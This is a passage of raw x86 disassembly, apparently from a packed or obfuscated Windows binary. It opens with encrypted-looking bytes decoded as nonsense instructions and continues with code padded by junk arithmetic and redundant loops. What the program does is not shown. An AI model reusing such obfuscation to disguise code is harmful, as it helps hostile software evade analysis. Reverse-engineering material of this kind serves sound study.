  418afe:	adc    dl,al
  418b00:	dec    ebx
  418b01:	jo     0x418af2
  418b03:	pop    esi
  418b04:	arpl   WORD PTR [esi-0x44af542d],di
  418b0a:	add    eax,0xb74e8d01
  418b0f:	adc    al,0xf8
  418b11:	lds    ebx,FWORD PTR [edi]
  418b13:	push   esi
  418b14:	mov    eax,ds:0xe214f55d
  418b19:	aaa    
  418b1a:	or     ebp,edi
  418b1c:	mov    esp,0x63e755b9
  418b21:	jp     0x418b6c
  418b23:	mov    ch,0x22
  418b25:	lods   eax,DWORD PTR ds:[esi]
  418b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b27:	lods   eax,DWORD PTR ds:[esi]
  418b28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b29:	or     edi,DWORD PTR [ebx-0x3a]
  418b2c:	pop    esp
  418b2d:	faddp  st(1),st
  418b2f:	jge    0x418ac0
  418b31:	aam    0xe0
  418b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b34:	adc    al,0xb7
  418b36:	or     DWORD PTR ds:0x729f4d90,0x480c03bd
  418b40:	leave  
  418b41:	sbb    esp,ecx
  418b43:	daa    
  418b44:	push   ss
  418b45:	into   
  418b46:	fstp   TBYTE PTR [esi]
  418b48:	lds    esi,FWORD PTR [ebp+0x78a01f3]
  418b4e:	fcom   DWORD PTR [ebx+0x16]
  418b51:	mov    esi,0x87d2536d
  418b56:	sub    DWORD PTR [eax],ebp
  418b58:	in     al,dx
  418b59:	out    dx,eax
  418b5a:	pop    esi
  418b5b:	cmp    eax,0x5de34756
  418b60:	shl    DWORD PTR [ebp+0x9],cl
  418b63:	xchg   cl,cl
  418b65:	cmc    
  418b66:	pcmpeqd mm2,QWORD PTR es:[esi]
  418b6a:	popa   
  418b6b:	add    eax,0x5a2c3085
  418b70:	fwait
  418b71:	mov    dl,0x8e
  418b73:	test   BYTE PTR [edx],bl
  418b75:	fwait
  418b76:	sbb    edx,DWORD PTR [edi+0x16]
  418b79:	inc    edx
  418b7a:	test   al,0x48
  418b7c:	jae    0x418b15
  418b7e:	jno    0x418ba7
  418b80:	addr16 mov ah,0x21
  418b83:	mov    al,0xae
  418b85:	xchg   ecx,eax
  418b86:	jmp    FWORD PTR [ebx]
  418b88:	cs nop
  418b8a:	in     eax,dx
  418b8b:	sbb    DWORD PTR ds:0x315e397a,ebp
  418b91:	(bad)  
  418b92:	push   edi
  418b93:	iret   
  418b94:	cdq    
  418b95:	sub    eax,0x24c1cb12
  418b9a:	retf   0x1a05
  418b9d:	clc    
  418b9e:	mov    ebp,0x2a60cc1f
  418ba3:	out    0x87,al
  418ba5:	fadd   DWORD PTR [eax]
  418ba7:	fwait
  418ba8:	mov    ebp,0xe38e5e3e
  418bad:	loope  0x418b36
  418baf:	fistp  WORD PTR [esi-0x6ab6f610]
  418bb5:	daa    
  418bb6:	fistp  QWORD PTR [esi]
  418bb8:	lahf   
  418bb9:	or     eax,0x2435be06
  418bbe:	xchg   BYTE PTR [eax],dl
  418bc0:	dec    esi
  418bc1:	sub    DWORD PTR [edx],ebx
  418bc3:	scas   eax,DWORD PTR es:[edi]
  418bc4:	test   edx,0x45ea6347
  418bca:	push   eax
  418bcb:	jp     0x418b67
  418bcd:	mov    ds:0xd43f9ab,eax
  418bd2:	and    esi,ebp
  418bd4:	push   ecx
  418bd5:	xor    al,al
  418bd7:	xor    dh,BYTE PTR [edi-0x52]
  418bda:	jmp    0x418bab
  418bdc:	mov    al,ds:0xf0432bce
  418be1:	and    BYTE PTR [ebx],0xd2
  418be4:	adc    DWORD PTR [eax-0x52],ecx
  418be7:	push   ss
  418be8:	xchg   ebx,eax
  418be9:	(bad)  
  418bed:	popf   
  418bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bef:	add    eax,esp
  418bf1:	(bad)  
  418bf2:	jp     0x418bbd
  418bf4:	sbb    edi,0xfb26624c
  418bfa:	(bad)
  418bfd:	add    DWORD PTR fs:[eax+0x7b],eax
  418c01:	xchg   esi,eax
  418c02:	(bad)  
  418c03:	into   
  418c04:	mov    ?,WORD PTR [esi]
  418c06:	ja     0x418c11
  418c08:	inc    ebp
  418c09:	out    0x64,eax
  418c0b:	cdq    
  418c0c:	aam    0x8c
  418c0e:	ds push 0x32
  418c11:	out    dx,eax
  418c12:	mov    dl,0xf4
  418c14:	sbb    BYTE PTR [edx-0x2f],dh
  418c17:	pop    eax
  418c18:	xor    al,0xcd
  418c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c1b:	mov    esi,0x5a57dbd7
  418c20:	jge    0x418c55
  418c22:	xchg   edx,eax
  418c23:	imul   edi,DWORD PTR [ebx+0x2],0x4d
  418c27:	das    
  418c28:	ins    DWORD PTR es:[edi],dx
  418c29:	adc    BYTE PTR [ebx-0x5f83d731],al
  418c2f:	adc    bl,cl
  418c31:	loope  0x418cab
  418c33:	adc    BYTE PTR [edx],al
  418c35:	popa   
  418c36:	hlt    
  418c37:	je     0x418bdd
  418c39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c3a:	out    0xf0,al
  418c3c:	mov    ebp,esi
  418c3e:	gs push 0xd65d06da
  418c44:	jae    0x418c30
  418c46:	mov    bh,0xd6
  418c48:	adc    DWORD PTR [edi-0x4e34ff09],eax
  418c4e:	mov    eax,ds:0x2e535841
  418c53:	jp     0x418c9c
  418c55:	jnp    0x418cbb
  418c57:	mov    dh,0xaa
  418c59:	xchg   al,ch
  418c5b:	lock jnp 0x418c5f
  418c5e:	in     al,dx
  418c5f:	imul   ecx,DWORD PTR [eax-0x49449290],0x71
  418c66:	cs jne 0x418c91
  418c69:	cmp    eax,eax
  418c6b:	repnz aam 0x92
  418c6e:	fimul  WORD PTR [edx-0x493490ab]
  418c74:	retf   0xba09
  418c77:	outs   dx,DWORD PTR ds:[esi]
  418c78:	mov    dh,0xd4
  418c7a:	mov    dh,BYTE PTR [ebp+0xbb827ef]
  418c80:	sbb    BYTE PTR [eax],0xd7
  418c83:	test   dh,al
  418c85:	cmc    
  418c86:	out    dx,al
  418c87:	ret    
  418c88:	sub    esp,DWORD PTR [ebp+0x7f]
  418c8b:	ins    DWORD PTR es:[edi],dx
  418c8c:	mov    bl,0xf8
  418c8e:	pop    ebp
  418c8f:	retf   0x10a1
  418c92:	push   edi
  418c93:	cmp    ebx,DWORD PTR [eax+edi*1+0x1aa09475]
  418c9a:	retf   0x3fa5
  418c9d:	dec    esi
  418c9e:	mov    al,ds:0x25adc26c
  418ca3:	popa   
  418ca4:	cmp    dl,al
  418ca6:	ins    DWORD PTR es:[edi],dx
  418ca7:	fcom   QWORD PTR [ebp+ebx*2-0x7c]
  418cab:	int3   
  418cac:	xor    BYTE PTR [edi+0x3d],cl
  418caf:	jbe    0x418cf8
  418cb1:	push   0x3e
  418cb3:	aaa    
  418cb4:	mov    eax,ds:0xb0a4761d
  418cb9:	pause  
  418cbb:	div    DWORD PTR [ecx-0x48]
  418cbe:	dec    esi
  418cbf:	inc    esp
  418cc0:	adc    DWORD PTR [edi],ebx
  418cc2:	mov    DWORD PTR [ebx+0x38d9fd00],edi
  418cc8:	or     cl,ah
  418cca:	lods   al,BYTE PTR ds:[esi]
  418ccb:	pop    ds
  418ccc:	cld    
  418ccd:	inc    eax
  418cce:	fwait
  418ccf:	mov    ebp,0xead88bc6
  418cd4:	xchg   edx,eax
  418cd5:	test   eax,0xa266daf5
  418cda:	in     eax,dx
  418cdb:	pop    esi
  418cdc:	add    DWORD PTR [eax+0x1e],ebp
  418cdf:	dec    ebp
  418ce0:	jnp    0x418d3c
  418ce2:	xchg   edi,eax
  418ce3:	out    0xf7,eax
  418ce5:	inc    ecx
  418ce6:	cmp    eax,0x14320d1a
  418ceb:	arpl   WORD PTR [ebx+edi*4+0x79c55134],si
  418cf2:	or     ecx,DWORD PTR [ecx]
  418cf4:	push   eax
  418cf5:	sbb    al,0x34
  418cf7:	loopne 0x418c7e
  418cf9:	xchg   ebp,eax
  418cfa:	in     eax,0xdc
  418cfc:	fsubr  DWORD PTR [edi+0x2e]
  418cff:	mov    BYTE PTR [edx],dh
  418d01:	add    edx,DWORD PTR [edi-0x5f]
  418d04:	mov    ah,0x6a
  418d06:	fidiv  DWORD PTR [esi+0x1e582b38]
  418d0c:	in     eax,0x78
  418d0e:	and    dh,BYTE PTR [eax+0x2d125dab]
  418d14:	xchg   BYTE PTR ds:0xdbe0ce0d,cl
  418d1a:	aas    
  418d1b:	sbb    DWORD PTR [edi-0x3520ea80],edx
  418d21:	(bad)  
  418d22:	in     eax,0x83
  418d24:	adc    ch,0x2e
  418d27:	pushf  
  418d28:	nop
  418d29:	and    eax,0xbcc94ca
  418d2e:	and    al,dl
  418d30:	ret    0xb613
  418d33:	add    DWORD PTR [eax],0x69df86ab
  418d39:	mov    cl,0xa1
  418d3b:	popf   
  418d3c:	adc    eax,0xc58cd9b9
  418d41:	sub    edx,DWORD PTR [edx]
  418d43:	out    dx,al
  418d44:	in     eax,0xcc
  418d46:	pop    ds
  418d47:	test   al,0x5e
  418d49:	fs mov cl,0xc4
  418d4c:	call   0x773b:0x6867073c
  418d53:	dec    edi
  418d54:	ret    
  418d55:	jg     0x418dc4
  418d57:	stos   BYTE PTR es:[edi],al
  418d58:	push   eax
  418d59:	int3   
  418d5a:	sbb    BYTE PTR [ecx+ebx*2],dh
  418d5d:	sbb    al,0x70
  418d5f:	dec    esp
  418d60:	mov    ch,0x9f
  418d62:	stos   BYTE PTR es:[edi],al
  418d63:	mov    BYTE PTR ds:0xe40fd172,bl
  418d69:	mov    bh,0x9e
  418d6b:	aaa    
  418d6c:	ins    BYTE PTR es:[edi],dx
  418d6d:	or     al,cl
  418d6f:	sub    BYTE PTR [ebx+0x46],0xac
  418d73:	das    
  418d74:	aaa    
  418d75:	fsub   QWORD PTR [eax-0x47]
  418d78:	cmp    DWORD PTR [ebx+edx*4-0x1d825a9c],0xf3d0ee34
  418d83:	pop    es
  418d84:	sub    al,0xcc
  418d86:	xchg   edx,eax
  418d87:	aaa    
  418d88:	out    dx,al
  418d89:	lahf   
  418d8a:	out    0xd3,eax
  418d8c:	cli    
  418d8d:	fs mov bl,bl
  418d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d91:	dec    ebp
  418d92:	xor    edx,DWORD PTR [edi-0x58]
  418d95:	pop    es
  418d96:	pusha  
  418d97:	fs mov bh,0xb4
  418d9a:	loope  0x418e18
  418d9c:	and    DWORD PTR [esi+0x187a34d4],eax
  418da2:	xchg   ebx,eax
  418da3:	or     ebx,edi
  418da5:	aad    0x73
  418da7:	lahf   
  418da8:	push   0xffffffa4
  418daa:	test   ch,ch
  418dac:	mov    ebp,0x9e2cd319
  418db1:	inc    ebx
  418db2:	push   edx
  418db3:	mov    bl,0x3
  418db5:	inc    edi
  418db6:	cmp    DWORD PTR [esi-0x12],ebp
  418db9:	and    BYTE PTR [eax+edi*8+0x10],dl
  418dbd:	rol    BYTE PTR [eax-0x11],1
  418dc0:	and    eax,0x57a48de6
  418dc5:	or     eax,0x3509b5aa
  418dca:	mov    eax,ds:0x610d8df1
  418dcf:	mov    esi,0x566df36b
  418dd4:	sti    
  418dd5:	(bad)  
  418dd6:	xchg   BYTE PTR [ebp+0x52],bh
  418dd9:	(bad)  
  418dda:	xor    bh,BYTE PTR [edi-0x3e63fa89]
  418de0:	sahf   
  418de1:	sbb    edx,DWORD PTR [esi]
  418de3:	mov    eax,0xcc0584e9
  418de8:	nop
  418de9:	sub    DWORD PTR [ebx],ecx
  418deb:	mov    ?,WORD PTR [ebp+0x643a42eb]
  418df1:	loope  0x418e07
  418df3:	sahf   
  418df4:	retf   0xe0a7
  418df7:	jnp    0x418e5a
  418df9:	lock dec ebx
  418dfb:	sub    eax,0xfab7c83f
  418e00:	mov    eax,0x50091858
  418e05:	jnp    0x418dff
  418e07:	adc    esp,DWORD PTR [ebx]
  418e09:	mov    edx,DWORD PTR [ebp-0x10]
  418e0c:	or     DWORD PTR ds:0x428e9b,0x120f
  418e16:	mov    ebx,DWORD PTR [ebp-0x8]
  418e19:	adc    DWORD PTR ds:0x428e7b,0x428ec3
  418e23:	xor    edx,eax
  418e25:	or     DWORD PTR ds:0x428ec3,0x428e27
  418e2f:	xor    ebx,eax
  418e31:	sub    edx,ebx
  418e33:	sub    edx,esi
  418e35:	sbb    DWORD PTR ds:0x428e8f,0x4a4
  418e3f:	xor    edx,eax
  418e41:	mov    DWORD PTR [ebp-0x10],edx
  418e44:	mov    edx,DWORD PTR ds:0x428e2b
  418e4a:	mov    edx,DWORD PTR [ebp-0x14]
  418e4d:	mov    DWORD PTR [ebp+0x8],edx
  418e50:	mov    DWORD PTR ds:0x428e7b,0x3079
  418e5a:	jmp    0x418fdc
  418e5f:	xor    DWORD PTR ds:0x428eb3,0x4ecc
  418e69:	mov    edx,DWORD PTR [ebp+0x8]
  418e6c:	mov    ebx,DWORD PTR [ebp-0x8]
  418e6f:	adc    DWORD PTR ds:0x428ecf,0x68d0
  418e79:	xor    edx,eax
  418e7b:	xor    ebx,eax
  418e7d:	sub    edx,ebx
  418e7f:	or     DWORD PTR ds:0x428e9b,ecx
  418e85:	sub    edx,esi
  418e87:	and    DWORD PTR ds:0x428e9f,0x0
  418e91:	jmp    0x418ea5
  418e96:	xor    ebx,ebx
  418e98:	xor    ebx,DWORD PTR ds:0x428e9f
  418e9e:	inc    ebx
  418e9f:	mov    DWORD PTR ds:0x428e9f,ebx
  418ea5:	cmp    DWORD PTR ds:0x428e9f,0x1e
  418eac:	jae    0x418eec
  418eb2:	cmp    DWORD PTR ds:0x428e9f,0xc
  418eb9:	jge    0x418eec
  418ebf:	jmp    0x418ecd
  418ec4:	push   DWORD PTR [ebp-0x18]
  418ec7:	call   DWORD PTR ds:0x42a9df
  418ecd:	cmp    DWORD PTR ds:0x428e9f,0xb
  418ed4:	jne    0x418ee7
  418eda:	mov    ebx,DWORD PTR ds:0x428e9f
  418ee0:	inc    ebx
  418ee1:	mov    DWORD PTR ds:0x428e9f,ebx
  418ee7:	jmp    0x418e96
  418eec:	xor    edx,eax
  418eee:	mov    DWORD PTR [ebp+0x8],edx
  418ef1:	mov    edx,DWORD PTR [ebp+0x8]
  418ef4:	mov    ebx,DWORD PTR [ebp-0x58]
  418ef7:	sub    DWORD PTR ds:0x428e8f,0x48c7
  418f01:	add    edx,0x5708e4
  418f07:	and    DWORD PTR ds:0x428e2f,0x10a3
  418f11:	imul   edx,ebx
  418f14:	dec    ebx
  418f15:	mov    DWORD PTR [ebp-0x58],edx
  418f18:	adc    ebx,edx
  418f1a:	mov    edx,DWORD PTR [ebp+0x8]
  418f1d:	mov    ebx,DWORD PTR [ebp-0x54]
  418f20:	add    edx,0x64f882
  418f26:	or     edx,ebx
  418f28:	and    DWORD PTR ds:0x428e2b,edi
  418f2e:	mov    DWORD PTR [ebp-0x54],edx
  418f31:	mov    edx,DWORD PTR ds:0x428eeb
  418f37:	mov    ebx,DWORD PTR ds:0x428ef7
  418f3d:	sub    edx,ebx
  418f3f:	xor    edx,DWORD PTR [edx+ebx*1]
  418f42:	mov    edx,DWORD PTR [ebp+0x8]
  418f45:	mov    DWORD PTR ds:0x428ec3,0x13
  418f4f:	cmp    DWORD PTR ds:0x428ec3,0x0
  418f56:	je     0x418fa5
  418f5c:	cmp    DWORD PTR ds:0x428ec3,0x2
  418f63:	jl     0x418fa5
  418f69:	jmp    0x418f79
  418f6e:	push   0x4281a7
  418f73:	call   DWORD PTR ds:0x42a9e3
  418f79:	cmp    DWORD PTR ds:0x428ec3,0x3
  418f80:	jne    0x418f93
  418f86:	mov    ebx,DWORD PTR ds:0x428ec3
  418f8c:	dec    ebx
  418f8d:	mov    DWORD PTR ds:0x428ec3,ebx
  418f93:	mov    ebx,DWORD PTR ds:0x428ec3
  418f99:	dec    ebx
  418f9a:	mov    DWORD PTR ds:0x428ec3,ebx
  418fa0:	jmp    0x418f4f
  418fa5:	mov    ebx,DWORD PTR [ebp-0x50]
  418fa8:	add    edx,ecx
  418faa:	xor    edx,ebx
  418fac:	mov    DWORD PTR [ebp-0x50],edx
  418faf:	mov    edx,DWORD PTR [ebp+0x8]
  418fb2:	mov    ebx,DWORD PTR [ebp-0x4c]
  418fb5:	add    edx,edi
  418fb7:	and    edx,ebx
  418fb9:	mov    DWORD PTR [ebp-0x4c],edx
  418fbc:	mov    edx,DWORD PTR [ebp+0x8]
  418fbf:	mov    ebx,DWORD PTR [ebp-0x48]
  418fc2:	lea    edx,[ebx+edx*1+0x241fcdf]
  418fc9:	mov    DWORD PTR [ebp-0x48],edx
  418fcc:	mov    edx,DWORD PTR [ebp+0x8]
  418fcf:	mov    ebx,0xfa5e1522
  418fd4:	sub    ebx,edx
  418fd6:	add    ebx,DWORD PTR [ebp-0x44]
  418fd9:	mov    DWORD PTR [ebp-0x44],ebx
  418fdc:	mov    edx,DWORD PTR [ebp+0x8]
  418fdf:	xor    edx,eax
  418fe1:	add    edx,esi
  418fe3:	jne    0x418e5f
  418fe9:	mov    edx,DWORD PTR [ebp-0xc]
  418fec:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ff3:	mov    bl,BYTE PTR [ebp-0x1]
  418ff6:	cmp    dl,bl
  418ff8:	je     0x4190d6
  418ffe:	mov    ecx,DWORD PTR [ebp-0x5c]
  419001:	mov    edx,DWORD PTR [ebp-0xc]
  419004:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41900b:	mov    ebx,DWORD PTR [ebp+0xc]
  41900e:	xor    ecx,eax
  419010:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f6]
  419017:	jne    0x41920a
  41901d:	mov    ecx,DWORD PTR [ebp-0x5c]
  419020:	mov    edx,DWORD PTR [ebp+0xc]
  419023:	xor    ecx,eax
  419025:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f6]
  41902d:	mov    edx,DWORD PTR [ebp-0x18]
  419030:	xor    edx,eax
  419032:	add    edx,esi
  419034:	cmp    ecx,edx
  419036:	mov    ecx,DWORD PTR [ebp-0x14]
  419039:	mov    DWORD PTR [ebp+0x8],ecx
  41903c:	mov    ecx,DWORD PTR [ebp+0x8]
  41903f:	je     0x419312
  419045:	xor    ecx,eax
  419047:	add    ecx,esi
  419049:	mov    ecx,0x242ebf1
  41904e:	je     0x41915e
  419054:	mov    edx,DWORD PTR [ebp+0x8]
  419057:	mov    ebx,DWORD PTR [ebp-0x8]
  41905a:	xor    edx,eax
  41905c:	xor    ebx,eax
  41905e:	sub    edx,ebx
  419060:	sub    edx,esi
  419062:	xor    edx,eax
  419064:	mov    DWORD PTR [ebp+0x8],edx
  419067:	mov    edx,DWORD PTR [ebp+0x8]
  41906a:	mov    ebx,DWORD PTR [ebp-0x58]
  41906d:	add    edx,0x5708e4
  419073:	imul   edx,ebx
  419076:	mov    DWORD PTR [ebp-0x58],edx
  419079:	mov    edx,DWORD PTR [ebp+0x8]
  41907c:	mov    ebx,DWORD PTR [ebp-0x54]
  41907f:	add    edx,0x64f882
  419085:	or     edx,ebx
  419087:	mov    DWORD PTR [ebp-0x54],edx
  41908a:	mov    edx,DWORD PTR [ebp+0x8]
  41908d:	mov    ebx,DWORD PTR [ebp-0x50]
  419090:	add    edx,ecx
  419092:	xor    edx,ebx
  419094:	mov    DWORD PTR [ebp-0x50],edx
  419097:	mov    edx,DWORD PTR [ebp+0x8]
  41909a:	mov    ebx,DWORD PTR [ebp-0x4c]
  41909d:	add    edx,edi
  41909f:	and    edx,ebx
  4190a1:	mov    DWORD PTR [ebp-0x4c],edx
  4190a4:	mov    edx,DWORD PTR [ebp+0x8]
  4190a7:	mov    ebx,DWORD PTR [ebp-0x48]
  4190aa:	lea    edx,[ebx+edx*1+0x241fcdf]
  4190b1:	mov    DWORD PTR [ebp-0x48],edx
  4190b4:	mov    edx,DWORD PTR [ebp+0x8]
  4190b7:	mov    ebx,0xfa5e1522
  4190bc:	sub    ebx,edx
  4190be:	add    ebx,DWORD PTR [ebp-0x44]
  4190c1:	mov    DWORD PTR [ebp-0x44],ebx
  4190c4:	mov    edx,DWORD PTR [ebp+0x8]
  4190c7:	xor    edx,eax
  4190c9:	add    edx,esi
  4190cb:	jne    0x419054
  4190d1:	jmp    0x41915e
  4190d6:	mov    edx,DWORD PTR [ebp-0x14]
  4190d9:	mov    DWORD PTR [ebp+0x8],edx
  4190dc:	jmp    0x419151
  4190e1:	mov    edx,DWORD PTR [ebp+0x8]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x8]
  4190e7:	xor    edx,eax
  4190e9:	xor    ebx,eax
  4190eb:	sub    edx,ebx
  4190ed:	sub    edx,esi
  4190ef:	xor    edx,eax
  4190f1:	mov    DWORD PTR [ebp+0x8],edx
  4190f4:	mov    edx,DWORD PTR [ebp+0x8]
  4190f7:	mov    ebx,DWORD PTR [ebp-0x58]
  4190fa:	add    edx,0x5708e4
  419100:	imul   edx,ebx
  419103:	mov    DWORD PTR [ebp-0x58],edx
  419106:	mov    edx,DWORD PTR [ebp+0x8]
  419109:	mov    ebx,DWORD PTR [ebp-0x54]
  41910c:	add    edx,0x64f882
  419112:	or     edx,ebx
  419114:	mov    DWORD PTR [ebp-0x54],edx
  419117:	mov    edx,DWORD PTR [ebp+0x8]
  41911a:	mov    ebx,DWORD PTR [ebp-0x50]
  41911d:	add    edx,ecx
  41911f:	xor    edx,ebx
  419121:	mov    DWORD PTR [ebp-0x50],edx
  419124:	mov    edx,DWORD PTR [ebp+0x8]
  419127:	mov    ebx,DWORD PTR [ebp-0x4c]
  41912a:	add    edx,edi
  41912c:	and    edx,ebx
  41912e:	mov    DWORD PTR [ebp-0x4c],edx
  419131:	mov    edx,DWORD PTR [ebp+0x8]
  419134:	mov    ebx,DWORD PTR [ebp-0x48]
  419137:	lea    edx,[ebx+edx*1+0x241fcdf]
  41913e:	mov    DWORD PTR [ebp-0x48],edx
  419141:	mov    edx,DWORD PTR [ebp+0x8]
  419144:	mov    ebx,0xfa5e1522
  419149:	sub    ebx,edx
  41914b:	add    ebx,DWORD PTR [ebp-0x44]
  41914e:	mov    DWORD PTR [ebp-0x44],ebx
  419151:	mov    edx,DWORD PTR [ebp+0x8]
  419154:	xor    edx,eax
  419156:	add    edx,esi
  419158:	jne    0x4190e1
  41915e:	mov    edx,DWORD PTR [ebp-0x14]
  419161:	mov    DWORD PTR [ebp+0x8],edx
  419164:	jmp    0x4191d9
  419169:	mov    edx,DWORD PTR [ebp+0x8]
  41916c:	mov    ebx,DWORD PTR [ebp-0x8]
  41916f:	xor    edx,eax
  419171:	xor    ebx,eax
  419173:	sub    edx,ebx
  419175:	sub    edx,esi
  419177:	xor    edx,eax
  419179:	mov    DWORD PTR [ebp+0x8],edx
  41917c:	mov    edx,DWORD PTR [ebp+0x8]
  41917f:	mov    ebx,DWORD PTR [ebp-0x58]
  419182:	add    edx,0x5708e4
  419188:	imul   edx,ebx
  41918b:	mov    DWORD PTR [ebp-0x58],edx
  41918e:	mov    edx,DWORD PTR [ebp+0x8]
  419191:	mov    ebx,DWORD PTR [ebp-0x54]
  419194:	add    edx,0x64f882
  41919a:	or     edx,ebx
  41919c:	mov    DWORD PTR [ebp-0x54],edx
  41919f:	mov    edx,DWORD PTR [ebp+0x8]
  4191a2:	mov    ebx,DWORD PTR [ebp-0x50]
  4191a5:	add    edx,ecx
  4191a7:	xor    edx,ebx
  4191a9:	mov    DWORD PTR [ebp-0x50],edx
  4191ac:	mov    edx,DWORD PTR [ebp+0x8]
  4191af:	mov    ebx,DWORD PTR [ebp-0x4c]
  4191b2:	add    edx,edi
  4191b4:	and    edx,ebx
  4191b6:	mov    DWORD PTR [ebp-0x4c],edx
  4191b9:	mov    edx,DWORD PTR [ebp+0x8]
  4191bc:	mov    ebx,DWORD PTR [ebp-0x48]
  4191bf:	lea    edx,[ebx+edx*1+0x241fcdf]
  4191c6:	mov    DWORD PTR [ebp-0x48],edx
  4191c9:	mov    edx,DWORD PTR [ebp+0x8]
  4191cc:	mov    ebx,0xfa5e1522
  4191d1:	sub    ebx,edx
  4191d3:	add    ebx,DWORD PTR [ebp-0x44]
  4191d6:	mov    DWORD PTR [ebp-0x44],ebx
  4191d9:	mov    edx,DWORD PTR [ebp+0x8]
  4191dc:	xor    edx,eax
  4191de:	add    edx,esi
  4191e0:	jne    0x419169
  4191e6:	mov    edx,DWORD PTR [ebp-0x8]
  4191e9:	mov    ebx,DWORD PTR [ebp-0xc]
  4191ec:	xor    edx,eax
  4191ee:	lea    edx,[edx+ebx*1+0x3272f6]
  4191f5:	mov    DWORD PTR [ebp-0xc],edx
  4191f8:	mov    edx,DWORD PTR [ebp-0x10]
  4191fb:	xor    edx,eax
  4191fd:	add    edx,esi
  4191ff:	jne    0x416a2c
  419205:	jmp    0x41931c
  41920a:	mov    ecx,DWORD PTR [ebp-0x14]
  41920d:	mov    DWORD PTR [ebp+0x8],ecx
  419210:	jmp    0x419289
  419215:	mov    ecx,DWORD PTR [ebp+0x8]
  419218:	mov    edx,DWORD PTR [ebp-0x8]
  41921b:	xor    ecx,eax
  41921d:	xor    edx,eax
  41921f:	sub    ecx,edx
  419221:	sub    ecx,esi
  419223:	xor    ecx,eax
  419225:	mov    DWORD PTR [ebp+0x8],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,DWORD PTR [ebp-0x58]
  41922e:	add    ecx,0x5708e4
  419234:	imul   ecx,edx
  419237:	mov    DWORD PTR [ebp-0x58],ecx
  41923a:	mov    ecx,DWORD PTR [ebp+0x8]
  41923d:	mov    edx,DWORD PTR [ebp-0x54]
  419240:	add    ecx,0x64f882
  419246:	or     ecx,edx
  419248:	mov    DWORD PTR [ebp-0x54],ecx
  41924b:	mov    ecx,DWORD PTR [ebp+0x8]
  41924e:	mov    edx,DWORD PTR [ebp-0x50]
  419251:	add    ecx,0x242ebf1
  419257:	xor    ecx,edx
  419259:	mov    DWORD PTR [ebp-0x50],ecx
  41925c:	mov    ecx,DWORD PTR [ebp+0x8]
  41925f:	mov    edx,DWORD PTR [ebp-0x4c]
  419262:	add    ecx,edi
  419264:	and    ecx,edx
  419266:	mov    DWORD PTR [ebp-0x4c],ecx
  419269:	mov    ecx,DWORD PTR [ebp+0x8]
  41926c:	mov    edx,DWORD PTR [ebp-0x48]
  41926f:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419276:	mov    DWORD PTR [ebp-0x48],ecx
  419279:	mov    ecx,DWORD PTR [ebp+0x8]
  41927c:	mov    edx,0xfa5e1522
  419281:	sub    edx,ecx
  419283:	add    edx,DWORD PTR [ebp-0x44]
  419286:	mov    DWORD PTR [ebp-0x44],edx
  419289:	mov    ecx,DWORD PTR [ebp+0x8]
  41928c:	xor    ecx,eax
  41928e:	add    ecx,esi
  419290:	jne    0x419215
  419296:	jmp    0x419328
  41929b:	mov    ecx,DWORD PTR [ebp+0x8]
  41929e:	mov    edx,DWORD PTR [ebp-0x8]
  4192a1:	xor    ecx,eax
  4192a3:	xor    edx,eax
  4192a5:	sub    ecx,edx
  4192a7:	sub    ecx,esi
  4192a9:	xor    ecx,eax
  4192ab:	mov    DWORD PTR [ebp+0x8],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,DWORD PTR [ebp-0x58]
  4192b4:	add    ecx,0x5708e4
  4192ba:	imul   ecx,edx
  4192bd:	mov    DWORD PTR [ebp-0x58],ecx
  4192c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4192c3:	mov    edx,DWORD PTR [ebp-0x54]
  4192c6:	add    ecx,0x64f882
  4192cc:	or     ecx,edx
  4192ce:	mov    DWORD PTR [ebp-0x54],ecx
  4192d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4192d4:	mov    edx,DWORD PTR [ebp-0x50]
  4192d7:	add    ecx,0x242ebf1
  4192dd:	xor    ecx,edx
  4192df:	mov    DWORD PTR [ebp-0x50],ecx
  4192e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4192e5:	mov    edx,DWORD PTR [ebp-0x4c]
  4192e8:	add    ecx,edi
  4192ea:	and    ecx,edx
  4192ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4192ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4192f2:	mov    edx,DWORD PTR [ebp-0x48]
  4192f5:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192fc:	mov    DWORD PTR [ebp-0x48],ecx
  4192ff:	mov    ecx,DWORD PTR [ebp+0x8]
  419302:	mov    edx,0xfa5e1522
  419307:	sub    edx,ecx
  419309:	add    edx,DWORD PTR [ebp-0x44]
  41930c:	mov    DWORD PTR [ebp-0x44],edx
  41930f:	mov    ecx,DWORD PTR [ebp+0x8]
  419312:	xor    ecx,eax
  419314:	add    ecx,esi
  419316:	jne    0x41929b
  41931c:	mov    ecx,DWORD PTR [ebp-0x8]
  41931f:	xor    ecx,eax
  419321:	mov    eax,DWORD PTR [ebp+0x10]
  419324:	add    ecx,esi
  419326:	mov    DWORD PTR [eax],ecx
  419328:	pop    edi
  419329:	pop    esi
  41932a:	pop    ebx
  41932b:	leave  
  41932c:	ret    0xc
  41932f:	push   ebp
  419330:	mov    ebp,esp
  419332:	sub    esp,0x78
  419335:	and    DWORD PTR ds:0x428eaf,0x46d6
  41933f:	push   esi
  419340:	push   edi
  419341:	or     eax,DWORD PTR ds:0x428e37
  419347:	mov    eax,ds:0x428373
  41934c:	or     ecx,edi
  41934e:	mov    DWORD PTR [ebp-0x24],eax
  419351:	and    DWORD PTR ds:0x428eb3,0x0
  41935b:	jmp    0x41936b
  419360:	mov    eax,ds:0x428eb3
